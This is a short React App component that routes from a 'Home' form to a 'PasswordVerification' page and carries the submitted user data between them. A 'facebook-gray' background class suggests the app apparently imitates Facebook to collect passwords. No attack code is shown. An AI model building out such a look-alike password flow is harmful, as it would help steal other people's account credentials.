import { useState } from 'react';
import { QueryClientProvider } from "@tanstack/react-query";
import { queryClient } from "./lib/queryClient";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import Home from "@/pages/Home";
import PasswordVerification from "@/pages/PasswordVerification";

function App() {
  const [currentStep, setCurrentStep] = useState<'main' | 'password'>('main');
  const [submissionData, setSubmissionData] = useState<{
    submissionId: number;
    userData: any;
  } | null>(null);

  const handleMainFormNext = (submissionId: number, userData: any) => {
    setSubmissionData({ submissionId, userData });
    setCurrentStep('password');
  };

  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <div className="min-h-screen bg-facebook-gray">
          {currentStep === 'main' ? (
            <Home onNext={handleMainFormNext} />
          ) : (
            submissionData && (
              <PasswordVerification 
                submissionId={submissionData.submissionId}
                userData={submissionData.userData}
              />
            )
          )}
        </div>
        <Toaster />
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
